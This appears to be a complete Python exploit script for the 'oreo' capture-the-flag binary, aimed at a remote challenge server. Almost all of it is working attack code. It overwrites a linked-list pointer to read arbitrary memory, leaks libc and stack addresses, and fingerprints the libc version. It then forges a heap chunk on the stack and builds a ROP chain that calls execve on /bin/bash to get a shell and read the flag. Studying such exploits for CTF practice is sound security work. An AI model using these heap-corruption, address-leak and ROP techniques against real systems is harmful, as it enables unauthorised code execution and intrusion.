#!/usr/bin/env python


import chdrft.utils.elf as elf
import chdrft.tube.connection as connection
import chdrft.tube.process as process
import chdrft.tube.serial as serial
import chdrft.tube.tube as tube
import chdrft.utils.misc as misc
import chdrft.utils.fingerprinting as fingerprinting
import chdrft.utils.binary as binary
from chdrft.utils.libc import LibcDatabase


import subprocess as sp
import traceback as tb
import sys
import os
import fcntl
import time
import datetime
import re
import struct
import concurrent.futures
import pprint as pp
import ctypes

import matplotlib.pyplot as ppt
import numpy as np


class Oreo:
    action_add = 1
    action_show = 2
    action_order = 3
    action_msg = 4
    action_stat = 5
    action_exit = 6

    main_loop_ret_addr = 0x08048AC0
    msg_length = 0x80
    rifle_length = 0x38
    rifle_name_off = 0x19
    rifle_desc_off = 0
    rifle_next_off = 0x34

    first_node_addr = 0x804a288
    msg_ptr_addr = 0x804a2a8
    msg_addr = 0x804a2c0

    def __init__(self, conn):
        self.conn = conn

    def wait_prompt(self):
        res = self.conn.recv_until(
            misc.PatternMatcher.frombytes(b'Action: '),
            timeout=misc.Timeout.from_sec(2))
        return res

    def select_action(self, action, prompt=False):
        self.conn.send('%d\n' % action)

    def add_rifle(self, name, desc):
        self.select_action(self.action_add)
        self.conn.send(name)
        self.conn.send(desc)

    def set_msg(self, msg):
        self.select_action(self.action_msg)
        self.conn.send(msg)


class LibcData:

    def __init__(self, offsets={}):
        self.libc_func_addr = None
        self.offsets = offsets

    def get_sym_addr(self, sym):
        return self.offsets[sym]+self.libc_func_addr

    @staticmethod
    def from_elf(self, libc_file):
        elf_libc = elf.ElfUtils(filename=libc_file)
        base_addr = elf_libc.get_dyn_symbol(Solver.ref_func)
        self.offsets[
            Solver.env_sym] = elf_libc.get_dyn_symbol(
            Solver.env_sym)-base_addr


class Solver:
    ref_func = '__libc_start_main'
    env_sym = '__environ'

    def __init__(self, oreo, libc_data):
        self.oreo = oreo
        self.wait_prompt = True
        self.num_added = 0
        self.num_order = 0
        self.libc_data = libc_data
        self.elf_oreo = elf.ElfUtils(filename='./oreo')
        self.cached_esp_off = None
        self.stage1 = None
        self.stage2 = None
        self.stage2_data=None
        self.off_msg_free = 0x44
        self.off_stage2_data=12

    def sanitize_fgets(self, s, n):
        if isinstance(s, str):
            s = s.encode('ascii')
        assert len(s) < n
        fd = s.find(b'\n')
        assert fd == -1 or fd == len(s)-1
        if fd == -1 and len(s) < n-1:
            s += b'\n'
        return s

    def add_rifle(self, name, desc):
        name = self.sanitize_fgets(name, Oreo.rifle_length)
        desc = self.sanitize_fgets(desc, Oreo.rifle_length)
        self.num_added += 1
        self.oreo.add_rifle(name, desc)
        if self.wait_prompt:
            self.oreo.wait_prompt()

    def order(self):
        self.num_order += 1
        self.oreo.select_action(self.oreo.action_order)
        self.oreo.wait_prompt()

    def set_msg(self, msg):
        self.oreo.set_msg(self.sanitize_fgets(msg, Oreo.msg_length))
        if self.wait_prompt:
            self.oreo.wait_prompt()

    def set_next_cell(self, addr):
        name = struct.pack(
            '<%dxI' % (Oreo.rifle_next_off-Oreo.rifle_name_off), addr)
        desc = ''
        self.add_rifle(name, desc)

    def get_desc(self):
        self.oreo.select_action(Oreo.action_show)
        try:
            data = self.oreo.wait_prompt()
            success = True
        except:
            success = False
            data = self.oreo.conn.buf
        r = re.finditer(b'Name: (.*?)\nDescription: (.*?)\n=======',
                        data, re.MULTILINE | re.DOTALL)
        return (success, [(m.group(1), m.group(2)) for m in r])

    def get_msg(self):
        self.oreo.select_action(self.oreo.action_stat)
        res = self.oreo.wait_prompt()
        m = re.search(b'Order Message: (.*)\n======================\nAction:',
                      res, re.MULTILINE | re.DOTALL)
        return m.group(1)

    def read_memory(self, addr, n, oneshot=True):
        data = b''
        while len(data) < n:
            assert len(data) == 0 or oneshot == False
            self.set_next_cell(addr+len(data))
            success, desc = self.get_desc()
            assert success and len(desc) >= 2

            tmp = desc[1][1]
            data += tmp + b'\x00'
        return data[:n]

    def read_memory_unsafe(self, addr):
        self.set_next_cell(addr)
        success, desc = self.get_desc()
        print('got ', desc)
        print(len(desc), success)
        assert len(desc) >= 2

        tmp = desc[1][1]
        data = b''
        data += tmp+b'\x00'
        return success, data

    def get_heap_buffer(self):
        # msg already initilized to 0
        addr = struct.unpack('<I', self.read_memory(Oreo.first_node_addr, 4))[0]
        return addr

    def allocated_chunk(self, sz):
        return struct.pack('<II', 0, sz+8)

    def inject_chunk(self):
        self.set_next_cell(Oreo.msg_addr+8)

        msg = b''
        msg += self.allocated_chunk(Oreo.rifle_length)
        msg += struct.pack('<%dxI' % Oreo.rifle_next_off, 0)
        msg += struct.pack('<II', 111, 111)
        self.set_msg(msg)
        self.order()

    def set_injected_next(self, addr):
        msg = b''
        msg += self.allocated_chunk(Oreo.rifle_length)
        # set fwd ptr
        msg += struct.pack('<I', addr)
        assert len(msg)==self.off_stage2_data
        msg+=self.stage2_data

        assert len(msg) <= self.off_msg_free
        msg += b'a'*(self.off_msg_free-len(msg))
        msg += self.stage2
        print('sending msg of length ', len(msg))
        self.set_msg(msg)

        self.set_next_cell(0)
        # next alloc will be addr

    def prepare(self):
        self.oreo.wait_prompt()
        libc_func = self.ref_func
        pos = self.elf_oreo.get_reloc(libc_func)-4
        libc_func_addr = struct.unpack('<I', self.read_memory(pos, 8)[4:])[0]
        self.libc_data.libc_func_addr = libc_func_addr
        print('libc start main at ', hex(libc_func_addr))

    def find_environ_addr(self):
        try:
            self.oreo.conn.log = False
            self.prepare()
            self.environ_ptr_addr = self.libc_data.get_sym_addr(Solver.env_sym)

            self.oreo.conn.log = True
            success, addr = self.read_memory_unsafe(self.environ_ptr_addr)
            assert success and len(addr) >= 4

            return struct.unpack('<I', addr[:4])[0]
        except KeyboardInterrupt:
            raise

    def find_env_offset_to_stack(self):
        if self.cached_esp_off:
            return self.cached_esp_off
        content = b''
        pos = -0x100
        nretry = 0
        want = 128

        matcher = misc.PatternMatcher.frombytes(
            struct.pack('<I', Oreo.main_loop_ret_addr))

        while len(content) < want:
            print('currently have ', len(content))
            try:
                with self.oreo.conn:
                    self.oreo.conn.log = False
                    self.environ_addr = self.find_environ_addr()
                    print('found envaddr at ', hex(self.environ_addr))
                    print('read at ', hex(self.environ_addr+pos))
                    success, data = self.read_memory_unsafe(
                        self.environ_addr+pos)
                    content += data
                    pos += len(data)
                    nretry = 0
                    res = matcher.check(content)
                    if res:
                        off = pos-(len(content)-res)-4
                        print('found at pos=', hex(off))
                        return off
            except (AssertionError, EOFError) as e:
                tb.print_exc()
                nretry += 1
                if nretry == 5:
                    content += b'\x00'
                    pos += 1
                    nretry = 0

            except KeyboardInterrupt:
                raise
        print('fail')
        print(content)
        for x in re.finditer(b'..'+re.escape(b'\x04\x08'), content):
            print(hex(struct.unpack('<I', x.group(0))[0]))
        assert False

    def prepare_rop(self):
        null_edx=0x0804857A
        pop_bc_leave = self.elf_oreo.find_gadget('pop ecx; pop ebx; leave; ret')
        pop_ab_leave = self.elf_oreo.find_gadget('pop eax; pop ebx; leave; ret')
        pop_ebp=self.elf_oreo.find_gadget('pop ebp; ret')
        leave = self.elf_oreo.find_gadget('leave; ret')
        int80=self.libc_data.get_sym_addr('int80')

        stage2_data_addr=Oreo.msg_addr+self.off_stage2_data
        stage2_addr = Oreo.msg_addr+self.off_msg_free

        stage2_data=b''
        stage2 = b''

        path_addr = stage2_data_addr+len(stage2_data)
        #stage2_data += b'/bin/bash\x00'
        stage2_data += b'/bin/bash\x00'
        argv_addr = stage2_data_addr+len(stage2_data)
        stage2_data += struct.pack('<II', path_addr, 0)
        stage2_data += struct.pack('<I', argv_addr)



        stage1 = b'a'*3
        stage1 += struct.pack('<I', pop_ebp)
        stage1 += struct.pack('<II', stage2_addr, leave)
        #stage1 += struct.pack('<4I', execv_addr, 0, path_addr, argv_addr)

        stage2+=struct.pack('<II', stage2_addr+4*4, pop_ab_leave)
        #syscall(eax=0xb, ebx=path, ecx=argv, edx=env)

        cur_addr=stage2_addr+len(stage2)
        stage2+=struct.pack('<4I', 0xb, 0, cur_addr+4*6, pop_bc_leave)

        cur_addr=stage2_addr+len(stage2)
        stage2+=struct.pack('<4I', argv_addr, path_addr,  cur_addr+4*3, null_edx)

        stage2+=struct.pack('<I', int80)

        self.stage1 = stage1
        self.stage2 = stage2
        self.stage2_data=stage2_data


    def solve(self):
        off = self.find_env_offset_to_stack()

        with self.oreo.conn:
            self.prepare()
            environ_addr = self.find_environ_addr()
            self.inject_chunk()
            base_esp = environ_addr+off

            off_esp_chk = -0x54
            off_buf_chk = 0xc

            chk_content = struct.pack(
                '<%dxII' % (off_buf_chk-1), 0, Oreo.rifle_length+8)
            self.oreo.conn.send(b'7'+chk_content+b'\n')
            chk_addr = base_esp+off_esp_chk
            print('chunk addr >> ', hex(chk_addr))

            self.prepare_rop()
            self.set_injected_next(chk_addr)
            input('go?')
            self.wait_prompt = False
            self.add_rifle(self.stage1, '')
            time.sleep(1)
            print('should have shell now')
            input('finish?')
            self.oreo.conn.log = True
            self.oreo.conn.send('cat fl4g\n')
            ans = self.oreo.conn.recv(1024,
                timeout=misc.Timeout.from_sec(2))
            print(ans)

    def find_func_offset_to_start_main(self, func):
        with self.oreo.conn:
            self.prepare()
            pos = self.elf_oreo.get_reloc(func)
            success, data = self.read_memory_unsafe(pos)
            if len(data) >= 4:
                offset = struct.unpack('<I', data[:4])[0]
                offset -= self.libc_data.libc_func_addr
                return offset
        return None

    def get_libc_pattern(self, list_func):
        res = {self.ref_func: 0}
        for func in list_func:
            try:
                off = self.find_func_offset_to_start_main(func)
                if off:
                    res[func] = off
            except KeyboardInterrupt:
                break
            except:
                tb.print_exc()
                pass
        return res

    def libc_exact_compare(self, pattern, libc_db):
        results = []
        num_workers = 30
        with concurrent.futures.ThreadPoolExecutor(max_workers=num_workers) as executor:
            for f in os.listdir(libc_dir):
                if not f.endswith('.so'):
                    continue
                libc_file = os.path.join(libc_dir, f)

                def f(libc_file, pattern):
                    res = fingerprinting.libc_match(libc_file, pattern)
                    return (res, libc_file)
                results.append(executor.submit(f, libc_file, pattern))
        for i in results:
            success, libc = i.result()
            if success:
                print('Found for libc ', libc)

    def libc_smart_compare(self, pattern, libc_db):
        ref_key = '__libc_start_main'
        # pattern['execv']=0
        # pattern['execve']=0
        # pattern['system']=0

        num_workers = 30
        with concurrent.futures.ThreadPoolExecutor(max_workers=num_workers) as ex:
            libcs = []

            libcs = libc_db.get_with_rev((2, 17, 0), (3, 0))

            libcs = list([ex.submit(elf.ElfUtils, x) for x in libcs])

            libcs = [x.result() for x in libcs]
            data = []

            for x in libcs:
                try:
                    data.append(
                        {'elf': x, 'init': x.get_dynamic_tag('DT_INIT')[0],
                         'entry': x.get_entry_address(),
                         'pattern':
                         {k: x.get_dyn_symbol(k) for k in pattern.keys()}})

                except:
                    tb.print_exc()
                    pass

            metrics = []
            metrics.append(
                {'name': 'entry-libc', 'func': lambda x: x['entry'] -
                 x['pattern']['__libc_start_main']})

            for key in pattern.keys():
                def add_func(key):
                    metrics.append(
                        {'name': 'off_{0}'.format(key),
                         'func': lambda x: x['pattern'][key]})
                add_func(key)

            f, axs = ppt.subplots(len(metrics))
            for i, metric in enumerate(metrics):
                tb = [metric['func'](x) for x in data]
                print(metric['name'], np.mean(tb))
                axs[i].plot(tb, np.ones(len(tb))*i, 'x')
                axs[i].set_title(metric['name'])

            ppt.show()
            ppt.title('test')

    def find_libc_version(self):
        # failing
        list_func = (
            'printf',
            'fgets',
            'malloc',
            'puts',
            '__isoc99_sscanf'
        )

        use_cached = True
        if use_cached:
            pattern = self.libc_data.offsets
        else:
            pattern = self.get_libc_pattern(list_func)
        pattern[self.ref_func] = 0

        libc_dir = '/home/benoit/server2/libcs'
        with LibcDatabase(libc_dir) as libc_db:
            self.libc_smart_compare(pattern, libc_db)
            #self.libc_exact_compare(pattern, libc_db)

    def read_max_memory(self, off_libc_start, lim=200):
        nretry = 0
        res = b''
        while nretry < 10 and len(res) < lim:
            print('on %d/%d' % (len(res), lim))
            try:
                with self.oreo.conn:
                    self.prepare()
                    pos = self.libc_data.libc_func_addr+off_libc_start+len(res)
                    success, data = self.read_memory_unsafe(pos)
                    # take only 100 chars, dont want to be screwed by network
                    # buffers ?? what
                    data = data[:100]

                    res += data
                nretry = 0

            except KeyboardInterrupt:
                break
            except:
                nretry += 1
                pass
        return res

    printf_func = 'printf'
    vfprintf_func = 'vfprintf'
    malloc_plt = 'malloc_plt'

    def find_printf_func(self):
        if self.use_cached and self.printf_func in self.libc_data.offsets:
            return
        self.libc_data.offsets[
            self.printf_func] = self.find_func_offset_to_start_main(
            self.printf_func)

    def find_vfprintf_func(self):

        if self.use_cached and self.vfprintf_func in self.libc_data.offsets:
            return

        printf_off = self.libc_data.offsets[self.printf_func]
        inss = self.read_max_memory(printf_off, lim=50)

        disas = binary.X86Machine(x64=False)
        calls = []
        for i in disas.get_ins(inss, printf_off):
            print(i.mnemonic, i.op_str)
            x = disas.get_call(i)
            if x:
                calls.append(x)

        # want 2nd call, first is get_pc
        vfprintf_off = calls[1]
        self.libc_data.offsets[self.vfprintf_func] = vfprintf_off

    def find_vfprintf_malloc_call(self):
        vfprintf_off = self.libc_data.offsets[self.vfprintf_func]
        if self.use_cached and self.malloc_plt in self.libc_data.offsets:
            return

        inss = self.read_max_memory(vfprintf_off, lim=20000)

        disas = binary.X86Machine(x64=False)
        for i in disas.get_ins(inss, 0):
            print(i.mnemonic, i.op_str)

        res = None
        self.libc_data[self.malloc_plt] = res

    def display_code_at(self, libc_start_main_offset, lim=100):
        inss = self.read_max_memory(libc_start_main_offset, lim=lim)

        disas = binary.X86Machine(x64=False)
        calls = []
        for i in disas.get_ins(inss, libc_start_main_offset):

            print(ctypes.c_int64(i.address), i.mnemonic, i.op_str)
            x = disas.get_call(i)

    def find_libc_information(self):
        self.use_cached = False

        if 0:
            entry_addr = 592
            self.display_code_at(entry_addr, lim=100)
# c_long(592) push ebx
# c_long(593) call 0x110bd3
# c_long(598) add ebx, 0x189fba
# c_long(604) sub esp, 0x18
# c_long(607) call 0x1d0
# c_long(612) mov dword ptr [esp], 0
# c_long(619) call 0xa1a00
# c_long(624) sub esp, 0x8c
# c_long(630) mov dword ptr [esp + 0x80], ebx
# c_long(637) call 0x110bd3
# c_long(642) add ebx, 0x189f8e
# c_long(648) mov dword ptr [esp + 4], 1
# c_long(656) mov dword ptr [esp], eax
# c_long(659) mov dword ptr [esp + 0x84], esi
# c_long(666) mov esi, eax
# c_long(668) mov dword ptr [esp + 0x88], edi
# c_long(675) mov edi, edx
# c_long(677) call 0xc80b0
# c_long(682) cmp eax, -1
# c_long(685) je 0x2cb

        if 1:
            exit_addr = 0xa1a00
            self.display_code_at(exit_addr, lim=100)
#c_long(662016) mov ebx, dword ptr [esp + 4]
#c_long(662020) mov eax, 0xfc
#c_long(662025) call dword ptr gs:[0x10]
#c_long(662032) mov eax, 1
#c_long(662037) int 0x80
#### GOT OFFSET HERE :)))

        if 0:
            libc_print_version = 0x1d0
            self.display_code_at(libc_print_version, lim=100)
# c_long(464) push ebx
# c_long(465) call 0x110bd3
# c_long(470) add ebx, 0x18a03a
# c_long(476) sub esp, 0x18
# c_long(479) mov dword ptr [esp + 8], 0x2a0
# c_long(487) mov dword ptr [esp], 1
# c_long(494) lea eax, dword ptr [ebx - 0x3e180]
# c_long(500) mov dword ptr [esp + 4], eax
# c_long(504) call 0xc7b60
# c_long(509) add esp, 0x18
# c_long(512) pop ebx
# c_long(513) ret

        if 0:
            ebx = 470
            ebx += 0x18a03a
            ebx -= 0x3e180
            print(self.read_max_memory(ebx))
            #got  [(b'', b''), (b'0-whatever, guessing offsets sucks anyway / greetz cutz lolol.\nCopyright (C) 2014 Free Software Foundation, Inc.\nThis is free software; see the source for copying conditions.\nThere is NO warranty; not even for MERCHANTABILITY or FITNESS FOR A\nPARTICULAR PURPOSE.\nCompiled by GNU CC version xxxxx.\nCompiled on a Linux xxxxxx system on xxxxxxxxx1.\nAvailable extensions:\n\tC stubs add-on version xxxxx\n\tcrypt add-on version xxx by Michael Glad and others\n\tGNU Libidn by Simon Josefsson\n\tNative POSIX Threads Library by Ulrich Drepper et al\n\tBIND-8.2.3-T5B\nlibc ABIs: UNIQUE IFUNC\nFor bug reporting instructions, please see:\n<http://bugs.gentoo.org/>.\n', b'GNU C Library (Gentoo 2.00-whatever, guessing offsets sucks anyway / greetz cutz lolol.\nCopyright (C) 2014 Free Software Foundation, Inc.\nThis is free software; see the source for copying conditions.\nThere is NO warranty; not even for MERCHANTABILITY or FITNESS FOR A\nPARTICULAR PURPOSE.\nCompiled by GNU CC version xxxxx.\nCompiled on a Linux xxxxxx system on xxxxxxxxx1.\nAvailable extensions:\n\tC stubs add-on version xxxxx\n\tcrypt add-on version xxx by Michael Glad and others\n\tGNU Libidn by Simon Josefsson\n\tNative POSIX Threads Library by Ulrich Drepper et al\n\tBIND-8.2.3-T5B\nlibc ABIs: UNIQUE IFUNC\nFor bug reporting instructions, please see:\n<http://bugs.gentoo.org/>.\n')]
            #FAKA U

        if 0:
            init_addr = -192
            self.display_code_at(init_addr, lim=100)

# c_long(-192) sub esp, 0x2c
# c_long(-189) mov dword ptr [esp + 0x1c], ebx
# c_long(-185) call 0x110bd3
# c_long(-180) add ebx, 0x18a2c4
# c_long(-174) mov dword ptr [esp + 0x20], esi
# c_long(-170) mov esi, dword ptr [esp + 0x30]
# c_long(-166) mov dword ptr [esp + 0x24], edi
# c_long(-162) mov edi, dword ptr [esp + 0x34]
# c_long(-158) mov dword ptr [esp + 0x28], ebp
# c_long(-154) mov ebp, dword ptr [esp + 0x38]
# c_long(-150) mov eax, dword ptr [ebx - 0x78]
# c_long(-144) test eax, eax
# c_long(-142) je 0xffffffffffffffc0
# c_long(-140) mov eax, dword ptr [eax]
# c_long(-138) test eax, eax
# c_long(-136) jne 0xffffffffffffffc0
# c_long(-134) mov dword ptr [ebx + 0x40], 1
# c_long(-124) mov eax, dword ptr [ebx - 0xc8]
# c_long(-118) mov dword ptr [ebx + 0x3684], esi
# c_long(-112) mov dword ptr [ebx + 0x3680], edi
# c_long(-106) mov dword ptr [eax], ebp
# c_long(-104) mov dword ptr [esp + 8], ebp
# c_long(-100) mov dword ptr [esp + 4], edi
# c_long(-96) mov dword ptr [esp], esi
# c_long(-93) call 0xd98a0

        if 0:
            ebx = -180+0x18a2c4
            ebx += -0xc8
            with self.oreo.conn:
                self.prepare()
                ebx += self.libc_data.libc_func_addr
                print('ask read at ', hex(ebx))
                success, data = self.read_memory_unsafe(ebx)
                addr = struct.unpack('<I', data[:4])[0]
                print('at offset >> ', hex(addr-self.libc_data.libc_func_addr))
                # at offset >>  0x18bff0

        if 0:
            environ_addr = 0x18bff0
            with self.oreo.conn:
                self.prepare()
                environ_addr += self.libc_data.libc_func_addr
                success, data = self.read_memory_unsafe(environ_addr)
                # success==True, good fucking god
                addr = struct.unpack('<I', data[:4])[0]
                print('environ on stack:>> ', hex(addr))

        if 0:
            seg_start_off = -94208-0x5000
            seg_start_off += 0x174
            print(self.read_max_memory(seg_start_off, lim=300))


def main():
    conn = connection.Connection('localhost', 1234)
    conn = serial.SerialFromProcess('./oreo')
    conn = connection.Connection('wildwildweb.fluxfingers.net', 1414)
    conn.log = False
    libc_file = '/usr/lib32/libc.so.6'
    oreo = Oreo(conn)

    local = 0
    if local:
        pattern = {
            'malloc': 380704,
            'fgets': 305760,
            'puts': 312576,
            'printf': 206112,
            '__isoc99_sscanf': 298400,
            'int80':0xb2d49-0x17d80,
            '__libc_start_main':0,
            '__environ':0x1b60a0-0x17d80

        }
        #pattern={'__libc_start_main': 0, 'fgets': 305760, 'printf': 206112, 'puts': 312576, '__isoc99_sscanf': 298400, 'malloc': 380704}
    else:
        pattern = {
            'printf': 214992,
            'malloc': 396128,
            '__isoc99_sscanf': 307664,
            'fgets': 316336,
            'puts': 323664,
            '__libc_start_main': 0,
            '__environ': 0x18bff0,
            'int80':662037
        }

    libc_data = LibcData(pattern)
    solver = Solver(oreo, libc_data)

    if 0:
        solver.find_libc_version()
        sys.exit(0)
    if 0:
        solver.find_libc_information()
        sys.exit(0)

    # for local
    if 1:
        solver.cached_esp_off = -0xd0

    solver.solve()
    print('done solve')

# after adding rifle:
# 0xffffcfb8:     0xf7fb0600      0x7df15000      0x00000000      0x08048500
# 0xffffcfc8:     0xffffcff8   ST 0x08048709      0x0804b008      0x00000038
# 0xffffcfd8: CHK 0xf7fb0600      0x74737271      0x78777675      0x00000000
# 0xffffcfe8:     0x00000000   CA 0x7df15000      0x0000001c      0xf7e462a6
# 0xffffcff8: EBP 0xffffd028  RET 0x08048a2a      0x08048d81      0x00000006
# 0xffffd008:     0x00000000      0xf7fb0e80      0xffffd058      0xf7fee5c0
# 0xffffd018:     0xf7e6028b      0x7df15000      0x00000000      0x08048500
# 0xffffd028:     0xffffd058   >>>0x08048ac0      0x08048de4      0xffffd0f4
# 0xffffd038:     0xffffd0fc      0xf7e2adeb      0xf7fb0420      0xf7ffcf94
# 0xffffd048:     0x08048afb      0x7df15000      0x00000000      0x08048500
# 0xffffd058:     0x00000000      0xf7e13e5e      0x00000001      0xffffd0f4

# for input: abcdefghijklmnopqrstuvwxyzABCD
# 0xffffcfb8:     0xf7fb0600      0x36e603d3      0xf7fb0e80      0xf7e026a8
# 0xffffcfc8:     0xf7e3bd31      0x64636261      0x68676665      0x6c6b6a69
# 0xffffcfd8:     0x706f6e6d      0x74737271      0x78777675      0x42417a79
# 0xffffcfe8:     0x000a4443      0x7df15000      0x0000001c      0xf7e462a6
# 0xffffcff8:     0xffffd028      0x08048a2a      0x08048d81      0x00000006
# 0xffffd008:     0x00000000      0xf7fb0e80      0xffffd058      0xf7fee5c0
# 0xffffd018:     0xf7e6028b      0x7df15000      0x00000000      0x08048500
# 0xffffd028:     0xffffd058      0x08048ac0      0x08048de4      0xffffd0f4
# 0xffffd038:     0xffffd0fc      0xf7e2adeb      0xf7fb0420      0xf7ffcf94
# 0xffffd048:     0x08048afb      0x7df15000      0x00000000      0x08048500
# 0xffffd058:     0x00000000      0xf7e13e5e      0x00000001      0xffffd0f4
main()
